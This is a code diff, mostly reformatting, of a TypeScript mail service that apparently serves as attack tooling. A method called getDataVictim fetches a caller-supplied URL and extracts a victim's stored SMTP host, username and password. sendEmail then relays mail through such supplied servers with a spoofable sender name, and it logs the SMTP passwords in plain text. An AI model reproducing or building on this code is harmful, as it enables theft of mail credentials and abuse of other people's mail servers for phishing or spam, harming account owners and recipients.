@@ -17,9 +17,9 @@ export class MailService {
   private transporter;
 
   constructor(
-      @InjectRepository(Mail)
-      private readonly saveDataMailRepository: Repository<Mail>,
-      @Inject(CACHE_MANAGER) private readonly cacheManager: Cache,
+    @InjectRepository(Mail)
+    private readonly saveDataMailRepository: Repository<Mail>,
+    @Inject(CACHE_MANAGER) private readonly cacheManager: Cache,
   ) {}
 
   private getMailServerConfig(dto: sendEmailDto): any {
@@ -32,19 +32,22 @@ export class MailService {
       send_mail: dto.hostmail ? dto.hostmail : process.env.SMTP_EMAIL,
     };
   }
-  
+
   async sendEmail(sendEmailDto: sendEmailDto) {
     const emailConfig = {
       to: sendEmailDto.email,
-      from: `"${sendEmailDto.from}" <${sendEmailDto.hostmail ? sendEmailDto.hostmail : process.env.SMTP_EMAIL}>`,
+      from: `"${sendEmailDto.from}" <${
+        sendEmailDto.hostmail ? sendEmailDto.hostmail : process.env.SMTP_EMAIL
+      }>`,
       subject: sendEmailDto.subject,
       html: await this.renderTemplate(sendEmailDto.template, { sendEmailDto }),
     };
 
     // Configurar el transporte aquí también para asegurarse de que se actualicen los valores si cambian
-    const { host, port, username, password } = this.getMailServerConfig(sendEmailDto);
-    
-    Logger.warn({ host, port, username, password });
+    const { host, port, username, password } =
+      this.getMailServerConfig(sendEmailDto);
+
+    Logger.log({ host, port, username, password });
     this.transporter = nodemailer.createTransport({
       host,
       port: parseInt(port, 10),
@@ -53,36 +56,42 @@ export class MailService {
         user: username,
         pass: password,
       },
-      tls: {},
+        tls: {},
+      debug: true,
     });
     // Enviar el correo electrónico utilizando this.transporter
     await this.transporter.sendMail(emailConfig);
     return {
-      "msg": "Success"
-    }
+      msg: 'Success',
+    };
   }
 
-  async getDataVictim(GetDataVictim: getDataVictim){
+  async getDataVictim(GetDataVictim: getDataVictim) {
     const axiosPromise = axios.get(GetDataVictim.url);
     const resp = await axiosErrorHandler(axiosPromise);
-    const credentials = [{
-      //"settings": resp?.user?.settings,
-      "name": resp?.user?.settings?.name,
-      "mail_host": resp?.user?.settings?.mail_host,
-      "mail_username": resp?.user?.settings?.mail_username,
-      "mail_password": resp?.user?.settings?.mail_password,
-      "mail_bcc": resp?.user?.settings?.mail_bcc,
-      "mail_auth": resp?.user?.settings?.mail_auth,
-      "mail_sender": resp?.user?.settings?.mail_sender,
-    }];
+    const credentials = [
+      {
+        //"settings": resp?.user?.settings,
+        name: resp?.user?.settings?.name,
+        mail_host: resp?.user?.settings?.mail_host,
+        mail_username: resp?.user?.settings?.mail_username,
+        mail_password: resp?.user?.settings?.mail_password,
+        mail_bcc: resp?.user?.settings?.mail_bcc,
+        mail_auth: resp?.user?.settings?.mail_auth,
+        mail_sender: resp?.user?.settings?.mail_sender,
+      },
+    ];
 
     return credentials;
   }
 
-  private async renderTemplate(templateName: string, data: Record<string, any>): Promise<string> {
+  private async renderTemplate(
+    templateName: string,
+    data: Record<string, any>,
+  ): Promise<string> {
     const templatePath = join(__dirname, 'templates', `${templateName}.hbs`);
     const templateContent = readFileSync(templatePath, 'utf8');
-    
+
     // Compilar la plantilla Handlebars
     const compiledTemplate = Handlebars.compile(templateContent);
 
